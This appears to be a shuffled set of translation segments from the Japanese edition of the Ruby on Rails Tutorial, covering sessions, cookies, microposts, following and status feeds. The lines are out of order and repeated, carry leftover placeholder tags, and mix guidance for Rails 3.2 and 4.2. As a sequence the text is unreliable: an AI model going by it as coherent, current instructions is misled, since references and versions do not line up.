「Ctrl-C」と同様に「Ctrl-D」と表記する慣習になっていますが、 実際に押すのは小文字のdなので、シフトキーを押し続ける必要はありません。
\kode{new}アクションを生成すると、それに対応する\emph{ビュー}も生成されます。\kode{create}や\kode{destroy}には対応するビューがない (=不要) なので、無駄なビューを作成しないためにここではnewだけを指定しています。
これはリスト\ref{code:log_out_with_forget}で使用されていました。
2番目の地味な問題は、ユーザーが複数のブラウザ (ChromeやFirefoxなど) でログインしていたときに生じます。具体的には、一方のブラウザではログアウトし、もう一方のブラウザではログアウトせずに、一度ブラウザを終了させ、再度同じページを開くと、この問題が発生します
一方、Chromeを閉じたとき、\kode{session[:user_id]}は\kode{nil}になります (これはブラウザが閉じたときに、全てのセッション変数の有効期限が切れるためです)。しかし、\kode{cookies}はブラウザの中に残り続けているため、データベースからそのユーザーを見つけることができてしまいます。
Railsを「デフォルトスタック」のまま無改造で使うことにしました。これに伴い、テスティングフレームワークも従来使用していたRSpecから、標準のminitestに切り替えました。
本チュートリアルで学ぶうえで必要となる前提知識は、「公式には」ありません。\emph{Railsチュートリアル}には必要な要素がすべて盛り込まれています。中心となるのはもちろんRailsですが、他にもRuby言語やminitest (Railsのテスティングフレームワーク) 、\href{http://en.wikipedia.org/wiki/HTML}{HTML}、\href{http://en.wikipedia.org/wiki/CSS}{CSS}、若干の\href{http://en.wikipedia.org/wiki/JavaScript}{JavaScript}と\href{http://en.wikipedia.org/wiki/SQL}{SQL}のチュートリアルもあります。
\kode{new}アクションを生成すると、それに対応する\emph{ビュー}も生成されます。\kode{create}や\kode{destroy}には対応するビューがない (=不要) なので、無駄なビューを作成しないためにここではnewだけを指定しています。
リスト\ref{code:rails_command}のコマンドでは、Railsのバージョンを(\kode{_4.2.0_})と明示的に指定している点にご注目ください。
実際には「Ctrlキーを押しながらcキーを押す」ことを意味します。このとき、大文字のCにするためにShiftキーも一緒に押す必要はありません。表記上の習慣により大文字で「Ctrl+C」と書かれているに過ぎません。
Git (というよりバージョン管理) はそれだけで大きなテーマなので、すべてを説明しようとすると軽く一冊の本を超えてしまいます。本チュートリアルでは簡単に言及するにとどめますが、幸いネット上には無償で利用できるリソースがあふれています。その中でも特に、ザックリと知るには「\href{https://confluence.atlassian.com/display/BITBUCKET/Clone+your+Git+repository+and+add+source+files}{BitBucket 101} (英語のみ)」を、じっくりと学ぶには「\href{http://git-scm.com/book}{\emph{Pro Git}} (日本語�あり)」Scott Chacon (Apress, 2009) をお勧めいたします。
これはリスト\ref{code:remember_me_ternary}で使用されていました。
なお、\kode{follower}の関連付けについては、\ref{sec:followers}に入るまでは使いません。しかしfollowerとfollowedを対称的に実装しておくことで、構造に対する理解は容易になるはずです。
 リスト\ref{code:relationships_fixtures}のfixtureでは、前半の2つでMichaelがLanaとMalloryをフォローし、後半の2つでLanaとArcherがMichaelをフォローしています。
selfを省略した結果をリスト\ref{code:gitignore_uploads}に示します。
(\emph{Note}: If you completed the exercise corresponding to Listing \ref{code:base_title_test}, you should retain the \kode{setup} method defining the \kode{@base_title} variable.)
Rubyにおいて\kode{nil}は特別なオブジェクトです。Rubyのオブジェクトのうち、オブジェクトそのものの論理値がfalseになるのは、(\kode{false}というオブジェクト自身を除いて) nil\emph{だけ}です。
次に、\kode{data-turbolinks-track}におけるキーと値のペアの表記が、旧式のハッシュロケット (=>) スタイルになっている点が不思議です。
selfを省略した結果をリスト\ref{code:micropost_order_test}に示します。
(このコードは\emph{スコープ}に関する最初の例でもあります。
これはリスト\ref{code:micropost_ordering}で使用されていました。
数分待ってからページを再度読み込むと、このテキストは自動的に新しい時間に基づいて更新されます。
これはリスト\ref{code:microposts_controller_access_control}で使用されていました。
リスト\ref{code:mail_account_activation}では、\kode{mail}に\kode{subject}キーも引数として渡しています。この値はメールの件名になります。
# このコードは準備段階です。<n>    #
完全な実装は第11章「ユーザーをフォローする」を参照してください。
developmentサーバーを再起動してリスト\ref{code:development_email_settings}の設定を読み込んだら、次は{p2}で自動生成したUserメイラーの{3}プレビューファイル{/3}の更新が必要です (リスト\ref{code:generated_user_mailer_previews})。
ただしささいなことではありますが、マイクロポストの投稿が\emph{失敗する}と、 Homeページは\kode{@feed_items}インスタンス変数を期待しているため、現状では壊れてしまいます (このことはテストスイートを実行して確認できます)。
先ほどの順で書いた統合テストは、リスト\ref{code:micropost_interface_test}のようになります。
selfを省略した結果をリスト\ref{code:generalized_current_user}に示します。
このときacceptパラメータでは、リスト{p0}で許可したファイル形式を、{2}MIMEタイプ{/2}で指定するようにします。
作成したコードをリスト\ref{code:new_password_reset}に示します
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
これはリスト\ref{code:generalized_authenticated_p}で使用されていました。
selfを省略した結果をリスト\ref{code:password_reset_edit_action}に示します。
これはリスト\ref{code:sessions_resource}で使用されていました。
/sessions
新しいセッションを作成する
(注: \kode{form_for}の代わりに\kode{form_tag}を使うこともでき、Railsではこの方が慣用的な方法です。しかし、ユーザー登録フォームではform_forを使用する方が一般的であり、並列構造を強調するためにもform_forを使用しました。
これはリスト\ref{code:login_form_html}で使用されていました。
<div>
\kode{authenticate}メソッドは認証に失敗したときに\kode{false}を返す (\ref{sec:creating_and_authenticating_a_user}) ことを思い出しましょう。以上をまとめてユーザーログインを実装したものをリスト\ref{code:find_authenticate_user}に示します。
フラッシュメッセージはWebサイトのレイアウトに表示される (リスト\ref{code:layout_flash}) ので、\kode{flash[:danger]}で設定したメッセージは自動的に表示されます。Bootstrap CSSのおかげで適切なスタイルも与えられます (図\ref{fig:failed_login_flash})。
リスト{p0}で{2}log_in{/2}というヘルパーメソッドを定義できたので、やっと、ユーザーログインを行ってセッションの{2}create{/2}アクションを完了し、ユーザーのプロフィールページにリダイレクトする準備ができました。
最後に、以下のようにプロファイルへのリンクも追加します。
selfを省略した結果をリスト\ref{code:layout_login_logout_links}に示します。
作成したコードをリスト\ref{code:destroy_session}に示します
これはリスト\ref{code:add_remember_digest_to_users}で使用されていました。
\kode{cookies.signed[:user_id]}では自動的にユーザーIDのcookiesの暗号が解除され、元に戻ります。
もちろん、この\kode{cookies}は\emph{本物の}ハッシュではなく、実際には\kode{cookies}に割り当てを行ったときにブラウザ上のテキストの断片を\emph{保存}しているだけです。そうしたアプリケーションの実装の詳細を気にしなくてよい点に、Railsの美しさの一端が垣間見えます。
サンプルアプリケーションのコア部分を開発するために、これまでにユーザー、セッション、アカウント有効化、パスワードリセットという４つのリソースについて見てきました。そして、これらのうち「ユーザー」というリソースだけが、Active Recordによってデータベース上のテーブルと紐付いています。
この節で定義する\kode{belongs_to}/\kode{has_many}関連付けを使用することで、表\ref{table:association_methods}に示すようなメソッドをRailsで使えるようになります。
selfを省略した結果をリスト\ref{code:log_out_with_forget}に示します。
ただし、残念ながらデフォルトの順序が\emph{昇順}となっているので、このままでは数の小さい値から大きい値にソートされてしまいます (最も古い投稿が最初に表示されてしまいます)。
上のコードの場合、以下がその関数です。
これはリスト\ref{code:user_logout_test}で使用されていました。
この項では、ユーザーのプロフィール画面 (\kode{show.html.erb}) でそのユーザーのマイクロポストを表示させ、また、これまでに投稿した総数も表示するようにしていきます。
これを参考に、\kode{_micropost.html.erb}パーシャルを使ってマイクロポストのコレクションを表示しようとすると、次のようになります。
selfを省略した結果をリスト\ref{code:branch_no_raise}に示します。
これはリスト\ref{code:remember_method}で使用されていました。
\ref{sec:remember_me_checkbox}では、現在のアプリケーション設計では、リスト{p2}の統合テストで仮想の{3}remember_token{/3}属性にアクセスする手段がないことを説明しました。
このコードはリスト\ref{code:login_create_user_instance}で使用されていました。もうひとつ、
before_actionはデフォルトで両方のアクションに適用されるため、制限を適用するアクションを明示していないことに注意してください。
Usersリソースの場合と同様に、結合テストを使用します。
アカウントを有効化する段取りは、ユーザーログイン (\ref{sec:logging_in})、特にユーザーの記憶 (\ref{sec:remember_me}) と似ています。
selfを省略した結果をリスト\ref{code:activation_digest_test}に示します。
このコードはリスト\ref{code:generated_account_activation_view_text}で使用されていました。もうひとつ、
フィードアイテムパーシャルに削除リンクを追加する。
この場合、  \kode{find}ではなく\kode{find_by}を使用します。これは、前者ではマイクロポストがない場合に例外が発生しますが、後者は\kode{nil}を返すためです。
ところで、Rubyの例外処理に慣れている方なら、\kode{correct_user}のフィルタを以下のように書くこともできます。
rescue
\kode{Micropost}モデルを以下のように直接使用して\kode{correct_user}フィルタを実装することもできます。
これはリスト\ref{code:development_email_settings}で使用されていました。
まずは\texttt{carrierwave} gemを\kode{Gemfile}に追加しましょう (リスト\ref{code:gemfile_carrierwave})。
\kode{Gemfile}にCarrierWaveを追加する
\kode{send}メソッドの動作原理がわかったので、それに基いて\kode{authenticated?}メソッドを書き換えます。
以上の説明を実際のUserモデルに適用してできた、一般化された\kode{authenticated?}メソッドをリスト\ref{code:generalized_authenticated_p}に示します。
参考までに、最終状態の\kode{Gemfile}をリスト\ref{code:final_gemfile}に示します。
(\kode{user}を\kode{self}に切り替えるという手もあるのですが、\kode{self}はモデル内では必須ではないと\ref{sec:the_caveat}で解説したことを思い出しましょう)。
サイドバーのマイクロポストカウントのテストを追加してください。このとき、表示に単数形と複数形が正しく表示されているかどうかもテストしてください。
マイクロポストのページネーションのテストを追加してください。
削除リンクが、現在のユーザーによって作成されていないマイクロポストには表示されないことを確認するためのテストを作成してください。
これはリスト\ref{code:wrap}で使用されていました。
このとき、出力されたHTMLがRailsによってエスケープされるのを防ぐために\kode{raw}メソッドを使用してください。また、クロスサイトスクリプティング (XSS) を防ぐために\kode{sanitize}メソッドも使用してください。
これはリスト\ref{code:password_resets_resource}で使用されていました。
作成したコードをリスト\ref{code:password_reset_test}に示します
リスト\ref{code:password_reset_form}のとき
上のコードが動作するには、この\kode{password_reset_expired?}メソッドを定義する必要があります。
たとえば「Gemfile」というファイル名を検索すると、\kode{Gemfile}と\kode{Gemfile.lock}を含め、候補が6つも表示されてしまいます。
次は、\ref{sec:planning_the_application}と同じように、テキストエディタを使って\kode{Gemfile}に必要なgemを書き足していきます。
サンプルアプリケーション用の\kode{Gemfile}
ここで使用する\kode{Gemfile}で指定されているのと異なるバージョンのgem (Rails自身のgemを含む) をこれまでにインストールしていた場合は、以下のように\kode{bundle update}を実行してgemを\emph{更新}し、gemのバージョンを合わせておくとよいでしょう。
selfを省略した結果をリスト\ref{code:sample_app_readme}に示します。
次に、拡張子を \kode{.md} に変更し、Markdownファイルとして認識できるようにします。その後、これらの変更をコミットします。
{0}{1}リスト3.4{/1}{/0}をもう一度注意深く読んでみると、アクションとビューの関係性について理解できるでしょう。\kode{home}アクションは、\kode{home.html.erb}というビューに対応しています。
(パスしたときにも色を表示できるようにするには、\ref{sec:minitest_reporters}のminitestレポーターをオプションで追加する必要があります)。
Ruby on Rails Tutorial Sample App |
それでは、\kode{home.html.erb}ビューのコードを、{1}{2}リスト3.28{/2}{/1}のように、タイトルに含まれる"Home"という文字を置き換え、動作を確認しましょう。
この章では、他のユーザーをフォロー (およびフォロー解除) できるソーシャルレイヤーを追加し、各ユーザーのHomeページに、現在フォロー中のユーザーのステータスフィードを表示できるようにして、サンプルアプリケーションのコアを完成させます。
また、自分をフォローしているユーザーと、自分がフォローしているユーザーを同時に表示できるようにします。
(これで、HTMLビューのファイルの拡張子が\kode{.html.erb}となっている理由をおわかりいただけたと思います)。
2番目に人気のテンプレートとして\href{http://haml-lang.com/}{Haml}があり (注意: "HAML"ではありません) 、筆者は個人的にHamlの方が気に入っています。残念ながら\emph{十分に}普及していないため、初級者向けチュートリアルの採用は見送りました。
この節で説明するアイディアの多くは、最初なかなか意図が読み取れないこともあると思います。複雑なデータモデルも、腑に落ちるまで時間がかかることでしょう。
もし自分が混乱し始めていると感じたら、まずはこの章の最後まで進め、それからもう一度この章全体を読み返してみてください。読み返すことでよりよく理解できると思います。
Railsにおけるデフォルトの複数形の慣習に従えば、あるユーザーをフォローしているすべてのユーザーの集合は\emph{followers}となり、\kode{user.followers}はそれらのユーザーの配列を表すことになります。
これはもうリファクタリングしてHTMLの重複した構造をDRYにするしかないでしょう。ご想像のとおり、Railsにはそのために\emph{application.html.erb}という名前の\kode{レイアウト}ファイルがあります。最初\ref{sec:slightly_dynamic_pages}でこのレイアウトファイルの名前をわざわざ変えておきましたが、いよいよ以下のコマンドでファイル名を元に戻すことにしましょう。
さらに、このRelationshipモデルには今後一意性検証を追加する予定です。しかし、一意インデックスを使用していればリレーションシップが重複したときに\emph{必ず}エラーになるので、現時点では一意インデックスで十分です。
\kode{relationships}テーブルを作成するために、いつものようにデータベースのマイグレーションを行なってテストデータベースを準備しましょう。
フォローしているユーザーとフォロワーを実装する前に、ユーザーとリレーションシップの関連付けを行います。
このコードはリスト\ref{code:user_relationships_association}で使用されていました。もうひとつ、
リスト\ref{code:home_root_route}のコードにすると、\kode{static_pages/home}にアクセスしても動作しなくなります。
「\href{http://devcenter.heroku.com/articles/local-postgresql}{Heroku instructions for local PostgreSQL installation}」には、PostgreSQLをローカル環境にインストールする手順が紹介されてます。
selfを省略した結果をリスト\ref{code:Gemfile_pg_gem}に示します。
さらに、\kode{config/database.yml}ファイルと、PostgreSQLをローカル環境で動作させる方法を学ぶ必要があります。
selfを省略した結果をリスト\ref{code:gitignore}に示します。
以上の情報を元に、PostgreSQLを使用して開発データベースとテストデータベースを作成し、それぞれ設定を行うことが、この課題のゴールです。
PostgreSQLデータベースへの接続と内容表示には、\href{http://inductionapp.com/}{Induction}というツールが便利です。
もし行き詰まってしまったら、すぐにこの演習を飛ばして次の作業に進んでください。なお、既に説明したとおり、このチュートリアルで開発しているサンプルアプリケーションは、SQLiteとPostgreSQLのどちらについても完全に互換性があります。
リレーションシップというパズルの最後の一片は、\kode{user.followers}メソッドを追加することです。これは上の\kode{user.following}メソッドと対になります。
実は、\kode{follower_id}と\kode{followed_id}を入れ替えるだけで、フォロワーについてもユーザーのフォローのときとまったく同じ方法が使用できます。これは\kode{passive_relationships}と\kode{active_relationships}についても同じです。
一点、リスト{p0}で注意すべき箇所は、次のように参照先 ({2}followers{/2}) を指定するための{2}:source{/2}キーを省略してもよかったという点です。
また、テストファイルだけでなく、\kode{home.html.erb}ファイルが変更されると\kode{static_pages_test.rb}が自動的に実行されるようにGuardを設定することもできます。
実はすでに、リスト{p0}の{2}Gemfile{/2}で\texttt{guard} gemをアプリケーション内に取り込んでいます。したがって、あとは初期化するだけで動かすことができます。
曖昧さのない「フォローしているユーザー (followed users)」と、Twitter式の「フォローしている (following)」表示を両方採用しましたが、このルーティングでは仕組み上残念ながら曖昧な方の "following" を使用せざるを得ません。
selfを省略した結果をリスト\ref{code:following_followers_authorization_test}に示します。
これはリスト\ref{code:following_followers_tests}で使用されていました。
# Ruby on Rails チュートリアル：サンプルアプリケーション
Ruby on Rails 3.2 チュートリアル
このままでも支障はありませんが、やはりこのような例外には頼らない方がよいので、上ではひと手間かけてセキュリティのためのレイヤーを追加しました。
それにはまず、ドル記号 ($) を使用してDOM要素に一意のCSS idでアクセスする文法について知る必要があります。
ついに、サンプルアプリケーションの山頂が目の前に現れました。最後の難関、ステータスフィードの実装に取りかかりましょう。
これはリスト\ref{code:full_feed_test}で使用されていました。
selfを省略した結果をリスト\ref{code:user_feed}に示します。
Userモデルに完全なフィードを追加する。
ここで行いたい選択は、上よりももう少し複雑で、たとえば以下のような感じになります。
自動的に以下のコードに置き換えられます。
また、冒頭の\kode{Micropost.}が省略されていることにも注意してください。このコードはMicropostモデル自身の中に置かれることを前提としています。)
それ以外の追加は不要です。
実にクールだと思いますが、いかがでしょうか。
つまり、ここでは以下をそのまま使えばよいだけなのです。
これはリスト\ref{code:from_users_followed_by_first_cut}で使用されていました。
\kode{from_users_followed_by}の最初の実装。
いくつかのアプリケーションにおいては、この初期実装だけで目的が達成され、十分に思えるかもしれません。しかしリスト\ref{code:from_users_followed_by_first_cut}にはまだ足りないものがあります。それが何なのか、次の節に進む前に考えてみてください
このコードは、フォローしている\emph{すべての}ユーザーをメモリーから一気に取り出し、フォローしているユーザーの完全な配列を作り出します。
リスト\ref{code:from_users_followed_by_first_cut}の条件では、集合に内包されているかどうかだけしかチェックされていないため、この部分をもっと効率的なコードにできるはずです。そして、SQLは本来このような集合の操作に最適化されています。
リスト\ref{code:from_users_followed_by_second_cut}でコードを若干修正し、フィードをリファクタリングすることから始めましょう。
\kode{from_users_followed_by}を改良する。
# 与えられたユーザーがフォローしているユーザー達のマイクロポストを返す。
    following
    following
必要なサブセレクトを作成するための、より高度な方法については、「\href{http://pivotallabs.com/users/jsusser/blog/articles/567-hacking-a-subselect-in-activerecord}{ActiveRecordのサブセレクトをハックする} (英語)」というブログ記事を参照してください。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
\kode{from_users_followed_by}の最終的な実装。
"Ruby on Rails Tutorial Sample App | Home"
リスト\ref{code:from_users_followed_by_final}をもって、ステータスフィードの実装は完了です。
"Ruby on Rails Tutorial Sample App | About"
{0}{1}第11章{/1}{/0}ではただのプロトタイプでしたが (図\ref{fig:home_with_proto_feed})、リスト\ref{code:from_users_followed_by_final}の実装によって、Homeページで完全なフィードが表示できていることがわかります (図\ref{fig:home_page_with_feed})。
ステータスフィードが追加され、\emph{Ruby on Railsチュートリアル}の中心となるサンプルアプリケーションがとうとう完成しました。
これだけでもかなりの量ですが、Railsについて学ぶべきことはまだまだたくさんあります。
この節で提案するさまざまな拡張 (パスワードリマインダ、メールによる確認、サンプルアプリケーション向けには検索、返信、メッセージングなど) は、ほとんどがWebアプリケーションで一般的な機能です。
これらの拡張を1つか2つでも実装してみることで、本書から巣立って自分のアプリケーションを書くときにきっと役に立つことでしょう。
いざ実装し始めてみると思ったよりずっと難しく感じるかもしれませんが、それも当然です。新しい機能という真っ白なキャンバスを目の前にすれば、気後れしてしまうのも無理はありません。
皆さんが拡張を始めるにあたり、ささやかながら私から2つほど一般的なアドバイスをしてみたいと思います。
第一に、Railsアプリケーションに何らかの機能を追加するときには、ぜひ\href{http://railscasts.com/episodes/archive}{RailsCastsアーカイブ}をチェックしてみてください。今自分がやろうとしていることは、既にRyan Batesが取り上げたトピックにあるかもしれません
RailsCastsではテストを省略していることが多いので、その点には注意してください。1回のエピソードを短くまとめるためにテストを省略しているのですが、それに釣られてテスティングの重要性を軽く考えることのないようにしてください。
RailsCastでアイディアやヒントを得たら、新機能の実装はぜひともテスト駆動開発で進めることをお勧めいたします。
(その意味でも、RailsCast「\href{http://railscasts.com/episodes/275-how-i-test}{テスティングの方法} (英語)」をぜひ一度参照してください。
Ryan Bates自身も、現実にはテスト駆動開発を採用していることが多くありますし、彼のテスティングスタイルは本書のものと基本的に同じです。)
もし手頃なトピックがあれば、関連するRailsCastをウォッチすることで、時間を大幅に節約できることでしょう。
2) できるだけ念入りにGoogleで検索し、自分が調べようとしているトピックに言及しているブログやチュートリアルがないかどうか、よく探すことです。
Webアプリケーションの開発には常に困難がつきまといます。他人の経験と失敗から学ぶことも重要です。
以下の機能はどれも難易度がそれなりに高いので、実装に必要となるかもしれないツールについてのヒントも書いておきました。
たとえヒントがあったとしても、以下の機能が本書の最終章の演習よりも\emph{ずっと}難易度が高いことは変わりません。相当頑張ったにもかかわらず挫折することも当然あると思いますので、どうかそんなときには落ち込まないでください。
Twitterには、マイクロポスト入力中に\texttt{@}記号に続けてユーザーのログイン名を入力するとそのユーザーに返信できる機能があります。
このポストは、宛先のユーザーのフィードと、自分をフォローしているユーザーにのみ表示されます。
この返信機能の簡単なバージョンを実装してみましょう。具体的には、@replyは受信者のフィードと送信者のフィードにのみ表示されるようにします。
これを行うには、\kode{microposts}テーブルの\kode{in_reply_to}カラムと、追加の\kode{including_replies}スコープをMicropostモデルに追加する必要があるとおもいます
このサンプルアプリケーションには独自のユーザーログインがないので、ユーザーを一意に表す方法も考えなければならないでしょう。
1つの方法は、idと名前を組み合わせて\kode{@1-michael-hartl}のようにすることです。
もう1つの方法は、ユーザー登録の項目に一意のユーザー名を\emph{追加}し、@repliesで使えるようにすることです。
Twitterでは、マイクロポストの入力時に最初に “d” キーを押すとダイレクト (プライベート) メッセージを行える機能がサポートされています。
この機能をサンプルアプリケーションに実装してみましょう。
ヒントは、Messageモデルと、新規マイクロポストにマッチする正規表現です。
フォロワーの通知
ユーザーに新しくフォロワーが増えたときにメールで通知する機能を実装してみましょう。
続いて、メールでの通知機能をオプションとして選択可能にし、不要な場合は通知をオフにできるようにしてみましょう。
この機能を追加するには、Railsからメールを送信する機能を追加する必要があります。
最初にRailsCast「\href{http://railscasts.com/episodes/206-action-mailer-in-rails-3}{Rails 3のAction Mailer}」を参照してください。
パスワードリマインダー
現状のサンプルアプリケーションには、ユーザーがパスワードを忘れてしまったときの復旧手段がありません。
ユーザー登録の確認
現在のサンプルアプリケーションには、正規表現による最小限の確認以外に、メールアドレスを検証する手段がありません。
ユーザー登録時にメールアドレスを検証する手順を追加してください。
この新機能では、ユーザー作成時に「仮のユーザーアカウント」を作成し、アクティベーション用のURLをメールで送信し、URLにユーザーがアクセスしたらユーザーアカウントを有効にするという手順が必要です。
ユーザーアカウントを有効/無効にする方法については、「\href{http://www.google.com/search?q=state+machines+in+rails}{Rails ステートマシン}」でネットを検索してみてください。
RSSフィード
ユーザーごとのマイクロポストをRSSフィードする機能を実装してください。
次にステータスフィードをRSSフィードする機能も実装し、余裕があればフィードに認証スキームも追加してアクセスを制限してみてください。
ヒントについてはRailsCast「\href{http://railscasts.com/episodes/87-generating-rss-feeds}{RSSフィードの生成} (英語)」を参照してください。
REST API
多くのWebサイトはAPI (Application Programmer Interface) を公開しており、第三者のアプリケーションからリソースのget/post/put/deleteが行えるようになっています。
サンプルアプリケーションにもこのようなREST APIを実装してください。
セキュリティには十分注意してください。認可されたユーザーにのみAPIアクセスを許可する必要があります。
現在のサンプルアプリケーションには、ユーザーインデックスページを端から探すか、他のユーザーのフィードを表示する以外に、他のユーザーを検索する手段がありません。
この点を強化するために、検索機能を実装してください。
続いて、マイクロポストを検索する機能も追加してください。
あらかじめRailsCast「\href{http://railscasts.com/episodes/37-simple-search-form}{簡単な検索フォーム} (英語)」を参照しておくとよいでしょう。
このアプリケーションを共有ホストか専用のサーバーに本番展開するのであれば、\href{http://freelancing-god.github.com/ts/en/}{Thinking Sphinx}の導入をお勧めします (RailsCast「\href{http://railscasts.com/episodes/120-thinking-sphinx}{Thinking Sphinx} (英語)」も参照してください)。
Herokuで本番展開するのであれば、「\href{http://devcenter.heroku.com/articles/full-text-search}{Heroku全文検索機能}」マニュアル (英語) に従う必要があります。(訳注: @budougumi0617 さんがRails 4.0版における[SIMPLE_SEARCH_FORM]を公開してくれました。Thx!)
読むに値するRails関連の書籍やドキュメントは書店やWebでいくらでも見つけられます。正直、あまりの多さに閉口するほどです。
\href{http://railslab.newrelic.com/scaling-rails}{Scaling Rails}。本書\emph{Ruby on Railsチュートリアル}では、残念ながらパフォーマンス (性能)、最適化、スケーリングというテーマについてはほとんど追求できませんでした、
幸い、実際のWebサイトで深刻なスケーリングの問題に直面することはほとんどありません。そして、純粋なRailsに何を追加しても、そこには最適化の余地が生じるはずです。
もしパフォーマンスの問題が発生するようなことがあれば、\href{http://railslab.newrelic.com/scaling-rails}{Envy Labs}のGregg Pollackが著したこの\href{http://envylabs.com/}{Scaling Rails}シリーズを参照することから始めるのがよいでしょう。
サイト監視用に\href{http://scoutapp.com/}{Scout}と\href{http://www.newrelic.com/}{New Relic}{p2}の導入を検討することもお勧めいたします。
\emph{new relic}は「新しい遺跡」というトンチの効いたネーミングですが、この会社の創立者であるLew Cirneの名前のアナグラム (文字を入れ替えたもの) でもあります。
ご想像のとおり、スケーリングの話題 (プロファイリング、キャッシュ、バックグラウンドジョブなど) はRailsCastsでもたびたび取り上げられています。
これはリスト\ref{code:micropost_dependency_test}で使用されていました。
リファクタリング
      Contents
これはリスト\ref{code:home_feed_test}で使用されていました。
次に、Bundlerで使用する\kode{Gemfile} をテキストエディタで編集します。{1}{2}リスト2.1{/2}{/1}の内容に書き換えてください。
なお、現在の\kode{Gemfile}に対応するバージョンのRakeが確実に実行されるようにするために、\kode{bundle exec}を使用して\kode{rake}を実行します
たとえば、\href{http://0.0.0.0:3000/users}{/users}を表示すればすべてのユーザーの一覧が表示されますし、\href{http://0.0.0.0:3000/users/new}{/users/new}を表示すれば新規ユーザー作成ページが表示されます。
まずはユーザーの一覧を表示する\href{http://0.0.0.0:3000/users}{\texttt{index}}ページを見てみましょう。もちろん、この時点ではまだユーザーは登録されていません ({2}{3}図2.4{/3}{/2})。
{0}図2.4 {/0}{1}Usersリソース (\href{http://0.0.0.0:3000/users}{/users}) ページの最初の状態{/1}
ユーザーを新規作成するには、\href{http://0.0.0.0:3000/users/new}{\texttt{図2.5}}の{2}{3}new{/3}{/2}ページを表示します
{0}図2.5 {/0}{1}新規ユーザー作成ページ (\href{http://0.0.0.0:3000/users/new}{/users/new}){/1}
ユーザーが作成され、\href{http://0.0.0.0:3000/users/1}{\texttt{図2.6}}のように{2}{3}show{/3}{/2}ページが表示されます
ここで、URLが\href{http://0.0.0.0:3000/users/1}{/users/1}と表示されていることに注目してください。ご想像のとおり、この数字\kode{1}は{2}{3}図2.2{/3}{/2}の\kode{id}属性そのものです。
{0}図2.6 {/0}{1}ユーザー表示用のページ (\href{http://0.0.0.0:3000/users/1}{/users/1}){/1}
今度は、ユーザー情報を変更するために\href{http://0.0.0.0:3000/users/1/edit}{\texttt{edit}}ページを表示してみましょう ({2}{3}図2.7{/3}{/2})。
{0}図2.7{/0} {1}ユーザー編集用のページ (\href{http://0.0.0.0:3000/users/1/edit}{/users/1/edit}){/1}
ここで\href{http://0.0.0.0:3000/users/new}{\texttt{new}}ページに戻り、ユーザーをもう1人作成してみましょう。\href{http://0.0.0.0:3000/users}{\texttt{index}}ページを表示してみると、\ref{fig:demo_user_index_two_rails_3}のようにユーザーが追加されています。
{0}図2.9{/0} {1}2人目のユーザーが追加された一覧ページ (\href{http://0.0.0.0:3000/users}{/users}){/1}
具体的には、\href{http://0.0.0.0:3000/users}{/users}のindexページをブラウザで開くという典型的な操作を行うときに何が起こっているかをMVC ({1}{2}図2.11{/2}{/1}) で説明します。
\kode{@}記号で始まる変数はRubyでは\emph{インスタンス変数}と呼ばれます。ビューでは自動的にこれらのインスタンス変数を使用できます。この場合、{2}{3}リスト2.7{/3}{/2}の\kode{index.html.erb}ビューは、\kode{@users}の一覧を並べ、1行ごとにHTMLの行として出力します
レイアウトが整えられていない。
\href{http://0.0.0.0:3000/microposts/new}{/microposts/new}ページをブラウザで開き、新しいマイクロポストの情報を入力してマイクロポストをいくつか作成してみましょう ({1}{2}図2.12{/2}{/1})。
{0}図2.12{/0} {1}新しいマイクロポストの作成ページ (\href{http://0.0.0.0:3000/microposts/new}{/microposts/new}){/1}
{0}図2.13{/0} {1}マイクロポストのindexページ (\href{http://0.0.0.0:3000/microposts}{/microposts}){/1}
この章には多くの話題が盛り込まれていますが、一度読んだだけで理解する必要はまったくありません。
これは現在のレイアウトでも、\emph{ある点を除いて}達成されています。もしビューの1つから\kode{provide}呼び出しを削除すると、そのページ固有のタイトルの代わりに以下のタイトルが表示されます。
基本タイトルとしてはこれで正しいのですが、末尾に余分な縦棒\kode{|}が残ってしまっています。
以下のコマンドをコマンドラインで実行し、Railsコンソールを起動しましょう。
ただし、1つ重要な違いがあります。Rubyはシングルクォート文字列の中では式展開を行いません。
Webアプリケーションを作成するときに、ユーザーインターフェイスの概要をできるだけ早いうちに把握しておくことがしばしば有用です。
第一段階として、サンプルアプリケーションにリンクとスタイルを追加するために、サイトのレイアウトファイル\kode{application.html.erb} (リスト\ref{code:application_layout_full_title}で登場) にHTML構造を追加し、レイアウトファイルを更新します。
実はRuby 1.9では、ハッシュの要素の順序が入力順と同じであることを保証していますが、ハッシュを特定の順序に依存してカウントするのは得策ではありません。
ハッシュではシンボルをキーとして使うことが一般的なので、Ruby 1.9ではこのような特殊な場合のための新しい記法をサポートしています。
今後登場するスタイル要素を利用できるようにするために、\kode{home.html.erb}ビューに特別な要素をいくつか追加します(リスト\ref{code:signup_button})。
わかりやすくするために、このタグによって生成されるHTMLを以下に示します
\kode{alt}属性は、画像がない場合に代わりに表示される文字列です。また、視覚障害のあるユーザーが使用するスクリーンリーダーでは、この属性が読み上げられてそこに画像があることが示されます。
Railsでは幸いにも、この属性を指定せずに\kode{image_tag}を呼び出した場合は、画像ファイル名 (拡張子を除く) をデフォルトの\kode{alt}属性として自動的に付加してくれます。
実は、Ruby では丸括弧は使用してもしなくても構いません。以下の2つの行は同等です。
\texttt{Gemfile}へ\kode{bootstrap-sass}を追加する
実は、ハッシュが関数呼び出しの\emph{最後の}引数である場合は、波括弧を省略できます。以下の2つの行は同等です。
selfを省略した結果をリスト\ref{code:bootstrap_config}に示します。
Asset Pipeline互換の行を追加する。
このディレクトリ名とファイル名は、どちらも重要です。
(実際には少し余裕を持たせて78列にしてあります) 。
上のコードでは\kode{stylesheet_link_tag}関数を2つの引数で呼んでいます。最初の引数である文字列は、スタイルシートへのパスを示しています。次の引数であるハッシュには2つの要素があり、最初の要素はメディアタイプを示し、次の要素は\href{https://github.com/rails/turbolinks}{turbolinks}機能をオンにしています
(Turbolinksの詳細については、本書の次のドラフト版で説明します)。
\kode{header}タグに\kode{navbar-fixed-top}クラスが与えられているので、これに従ってBootstrapはナビゲーションバーをページ上部に固定し、ナビゲーションバーの下に余白を置いて主要部分から分離します
ファイル名\kode{_shim.html.erb}の前のアンダースコアに注目してください。このアンダースコアは、普遍的なパーシャルの命名規約であり、また、一目見ただけでディレクトリ中のすべてのパーシャルを識別することが可能になります。
もし上の例が少し不自然に思えるならば、勘が鋭いといえます。というのも、これはわざと不自然に書いたからです。
